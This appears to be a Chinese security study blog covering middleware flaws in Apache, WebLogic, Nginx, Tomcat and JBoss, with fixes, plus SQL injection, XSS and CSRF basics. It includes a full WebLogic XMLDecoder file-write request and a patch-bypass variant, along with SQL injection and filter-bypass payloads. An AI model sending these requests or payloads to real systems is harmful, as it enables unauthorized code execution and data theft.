<p>实战中可以上传rar， owf等文件进行利用，如果上传phpinfo.php.ipg，即使文件名中有.php，也会直接解析为ipg。因为Apache认识.pg,停止继续向左识别。</p>
<h3 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h3><p>如果运维人员给.php后缀增加了处理器: AddHandler application&#x2F;x-httpd-php .php<br>那么，在有多个后缀的情况下，只要一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p>即使最右边的文件格式是在mime.types文件内，只要文件名中出现.php，就直接被解析为php.</p>
<h3 id="Apache-HTTPD换行解析漏洞（CVE-2017-15715"><a href="#Apache-HTTPD换行解析漏洞（CVE-2017-15715" class="headerlink" title="Apache HTTPD换行解析漏洞（CVE-2017-15715)"></a>Apache HTTPD换行解析漏洞（CVE-2017-15715)</h3><p>影响范围:2.4.0~2.4.29版本<br>环境: phpstudy2014 Apache +PHP5.4n<br>此漏洞形成的根本原因，在于$,正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n或\r<br>在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h4 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h4><p>1.升级到最新版本.<br>2.或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</p>
<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>由于配置错误导致的目录遍历</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修改apache配置文件httpd.conf</p>
<p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p>
<h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和LJava Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<p>默认端口：7001</p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1）升级Oracle 10月份补丁。</p>
<p>2）对访问wls-wsat的资源进行访问控制。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件</p>
<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>打补丁</p>
<h2 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>
<h2 id="XMLDecoder反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506"><a href="#XMLDecoder反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506" class="headerlink" title="XMLDecoder反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506)"></a>XMLDecoder反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506)</h2><p>Weblogici的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。<br>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>返回如下页面，则可能存在此漏洞。</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328201323568.png" alt="image-20220328201323568"></p>
<p>只要是在wls-wsat包中的url皆受到影响，可以查看web.xml得知所有受到影响的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml</span><br></pre></td></tr></table></figure>

<p>默认受影响的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType </span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC </span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11 </span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11 </span><br><span class="line">/wls-wsat/ParticipantPortType11 </span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>构造写入文件数据包进行发送，如下，其中content-Type需要等于text&#x2F;xml，否则可能导致XMLDecoder不能解析。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1 </span><br><span class="line">Host: 127.0.0.1:7001 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0 </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Content-Type: text/xml </span><br><span class="line">Connection: close </span><br><span class="line">Content-Length: 629</span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> 					<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span> 						<span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span> 			 <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">            &lt;![CDATA[ &lt;% out.print(&quot;test777776666666&quot;); %&gt; ]]&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">object</span>&gt;</span> </span><br><span class="line">         <span class="tag">&lt;/<span class="name">java</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问&#x2F;bea_wls_internal&#x2F;test2.jsp,如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328202458726.png" alt="image-20220328202458726"></p>
<p>CVE-2017-3506的补丁加了验证函数，补丁在weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkContextXmlInputAdapter.java中添加了validate方法, 验证Payload中的节点是否 存在object Tag。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span>&#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span>factory.newSAXParser(); </span><br><span class="line">        parser.parse(is, newDefaultHandler() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, StringlocalName, String qName, Attributes attributes)</span><span class="keyword">throws</span> SAXException &#123; </span><br><span class="line">                <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123; </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid context type: object&quot;</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(ParserConfigurationException var5) &#123; </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var5); &#125; </span><br><span class="line">    <span class="keyword">catch</span> (SAXExceptionvar6) &#123; </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var6); &#125; </span><br><span class="line">    <span class="keyword">catch</span> (IOExceptionvar7) &#123; </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var7);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将object换成void就可绕过此补丁，产生了CVE-2017-10271。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span> 		</span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span> 			<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[ &lt;% out.print(&quot;test777776666666&quot;); %&gt; ]]&gt; <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><p>1）安装补丁。 </p>
<p>2）或删除wls-wsat组件，再次访问返回404. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.删除C:\Oracle\Middleware\wlserver_10.3\server\lib\wls-wsat.war </span><br><span class="line">2.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\.internal\wls-wsat.war </span><br><span class="line">3.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat </span><br><span class="line">4.重启Weblogic</span><br></pre></td></tr></table></figure>



<h2 id="Weblogic-wls9-async-response-wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725"><a href="#Weblogic-wls9-async-response-wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725" class="headerlink" title="Weblogic wls9_async_response,wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725)"></a>Weblogic wls9_async_response,wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725)</h2><p>影响组件：bea_wls9_async_response.war, wls-wsat.war </p>
<p>影响版本：10.3.6.0, 12.1.3.0 </p>
<p>访问 &#x2F;_async&#x2F;AsyncResponseService 返回如下页面，则可能存在此漏洞。</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328203645115.png" alt="image-20220328203645115"></p>
<p>漏洞不仅存在于 &#x2F;_async&#x2F;AsyncResponseService 只要是在bea_wls9_async_response包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml</span><br></pre></td></tr></table></figure>

<p>默认受影响的Uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/_async/AsyncResponseService </span><br><span class="line">/_async/AsyncResponseServiceJms </span><br><span class="line">/_async/AsyncResponseServiceHttps</span><br></pre></td></tr></table></figure>



<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>Nginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP&#x2F;POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好</p>
<h2 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h2><h3 id="漏洞介绍及成因"><a href="#漏洞介绍及成因" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h3><p>对任意文件名，在后面添加&#x2F;任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg&#x2F;x.php进行解析攻击。</p>
<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php&#x2F;1.jpg这样的目录时，只要1.jpg不存在就会显示404；</p>
<p>2） 将&#x2F;etc&#x2F;php5&#x2F;fpm&#x2F;pool.d&#x2F;<a href="http://www.conf/">www.conf</a>中security.limit_ectensions后面的值设为.php</p>
<h2 id="目录遍历-1"><a href="#目录遍历-1" class="headerlink" title="目录遍历"></a>目录遍历</h2><h3 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h3><p>Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露</p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>将&#x2F;etc&#x2F;nginx&#x2F;sites-avaliable&#x2F;default里的autoindex on改为autoindex off</p>
<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><h3 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h3><p>CRLF时“回车+换行”（\r\n）的简称。</p>
<p>HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。</p>
<p>通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>Nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;error1.conf修改为使用不解码的url跳转。</p>
<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><h3 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h3><p>Nginx反向代理，静态文件存储在&#x2F;home&#x2F;下，而访问时需要在url中输入files，配置文件中&#x2F;files没有用&#x2F;闭合，导致可以穿越至上层目录。</p>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>Nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;error2.conf的&#x2F;files使用&#x2F;闭合。</p>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用  服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP  程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （  标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat  时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h3 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h3><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
<p>2）更新并升级至最新版。</p>
<h2 id="war后门文件部署-1"><a href="#war后门文件部署-1" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h3><p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
<p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME&#x2F;conf&#x2F;web.xml文件设置锁定机制和时间超时限制。</p>
<p>3）以及针对manager-gui&#x2F;manager-status&#x2F;manager-script等目录页面设置最小权限访问限制。</p>
<p>4）后台管理避免弱口令。</p>
<h1 id="jBoss"><a href="#jBoss" class="headerlink" title="jBoss"></a>jBoss</h1><p>jBoss是一个基于J2EE的开发源代码的应用服务器。  JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB  2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<h2 id="反序列化漏洞-1"><a href="#反序列化漏洞-1" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="成因-6"><a href="#成因-6" class="headerlink" title="成因"></a>成因</h3><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现</p>
<h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
<p>2）用于对 httpinvoker 组件进行访问控制</p>
<h2 id="war后门文件部署-2"><a href="#war后门文件部署-2" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h3><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础总结</title>
    <url>/2022/01/05/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="一、web"><a href="#一、web" class="headerlink" title="一、web"></a>一、web</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><h3 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web应用程序对用户输入的数据过滤不严谨，并且把用户输入的数据当作sql语句去执行。</span><br></pre></td></tr></table></figure>

<h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反馈结果上分为</span><br><span class="line">	有回显型</span><br><span class="line">	无回显型</span><br><span class="line">攻击手法上分为</span><br><span class="line">	1.联合查询注入 union select</span><br><span class="line">	2.堆叠注入 在SQL语句中，语句的结束都是以&#x27;;&#x27;结尾，但是如果我们在&#x27;;&#x27;后面再加上一条SQL语句，两条语句会一起执行</span><br><span class="line">	3.报错注入 updatexml、floor、ExtractValue </span><br><span class="line">	ExtractValue 接收两个字符串参数，1传入xml文档，2是Xpath路径表示法表示的查找路径，语法错误就会报错</span><br><span class="line">	extracrvalue(0,concat(0x7e,database()))</span><br><span class="line">	UpdateXML 三个参数，1操作片段2xml路径3更新内容</span><br><span class="line">	updatexml(0,concat(0x7e,select database()),1)</span><br><span class="line">	floor，group by向临时表插入数据，rand多次计算报错。报错前concat中的语句被执行。</span><br><span class="line">	concat(floor(rand(0)*2),database()) x from information_schema.schemata group by </span><br><span class="line">	exp是个数学函数。</span><br><span class="line">	4.盲注</span><br><span class="line">		时间盲注    if sleep</span><br><span class="line">		布尔盲注    count，length</span><br><span class="line">	5.二次注入  sql-labs24关，插入admin‘# 修改密码，修改的是admin的密码</span><br><span class="line">	6.宽字节注入 php发送请求到mysql使用了gbk编码。%df吃掉%5c（\）</span><br><span class="line">	character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</span><br><span class="line">	7.mysql写shell用的函数outfile、dumpfile、开启log写shell</span><br><span class="line">	8.为什么参数化查询可以防止sql注入</span><br><span class="line">使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</span><br><span class="line">简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="sql常用语句"><a href="#sql常用语句" class="headerlink" title="sql常用语句"></a>sql常用语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查库selsct schema_name from information_schema.schemata</span><br><span class="line">查表select table_name from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">查列select column_name from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">查字段select username,password from security.users</span><br><span class="line">if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</span><br></pre></td></tr></table></figure>



<h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.注释符（#   --+）</span><br><span class="line">2.大小写绕过（or and ）</span><br><span class="line">3.双写绕过（oorrder）</span><br><span class="line">4.空格绕过 /**/  %09（Tab）</span><br><span class="line">5.对字符进行转义</span><br></pre></td></tr></table></figure>

<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.代码层</span><br><span class="line">黑名单、白名单、敏感字符过滤、规范输出</span><br><span class="line">2.配置层</span><br><span class="line">开启gpc（php的防御函数魔术引号开关）、使用utf-8</span><br><span class="line">3.物理层面</span><br><span class="line">WAF、IPS、数据库审计</span><br></pre></td></tr></table></figure>

<h2 id="2-xss（跨站脚本攻击）"><a href="#2-xss（跨站脚本攻击）" class="headerlink" title="2.xss（跨站脚本攻击）"></a>2.xss（跨站脚本攻击）</h2><h3 id="xss原理"><a href="#xss原理" class="headerlink" title="xss原理"></a>xss原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</span><br></pre></td></tr></table></figure>

<h3 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.反射型</span><br><span class="line">一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。</span><br><span class="line">2.存储型</span><br><span class="line">主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</span><br><span class="line">3.DOM型</span><br><span class="line">不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</span><br><span class="line">区别</span><br><span class="line">12都需要服务器解析，并与数据库交互3只用前端解析，不与数据库交互</span><br><span class="line">23都会将攻击代码长期存在到受害者服务器1只能攻击一次</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="xss绕过"><a href="#xss绕过" class="headerlink" title="xss绕过"></a>xss绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a标签、src属性、大小写、双写</span><br></pre></td></tr></table></figure>

<h3 id="xss防护"><a href="#xss防护" class="headerlink" title="xss防护"></a>xss防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编码、WAF、filter过滤敏感字符</span><br></pre></td></tr></table></figure>

<h2 id="3-csrf（跨站请求伪造攻击）"><a href="#3-csrf（跨站请求伪造攻击）" class="headerlink" title="3.csrf（跨站请求伪造攻击）"></a>3.csrf（跨站请求伪造攻击）</h2><h3 id="csrf原理"><a href="#csrf原理" class="headerlink" title="csrf原理"></a>csrf原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同一浏览器下，用户访问了攻击者的恶意链接，攻击者拿着你的“身份凭证”，冒充你进行相应的攻击。</span><br></pre></td></tr></table></figure>

<h3 id="csrf防护"><a href="#csrf防护" class="headerlink" title="csrf防护"></a>csrf防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.验证HTTP Referer字段</span><br><span class="line">2.在请求地址中添加Token验证</span><br><span class="line">3.在HTTP头中自定义属性并验证</span><br></pre></td></tr></table></figure>

<h3 id="csrf位置"><a href="#csrf位置" class="headerlink" title="csrf位置"></a>csrf位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码修改、点赞、删除、转账、注销</span><br></pre></td></tr></table></figure>

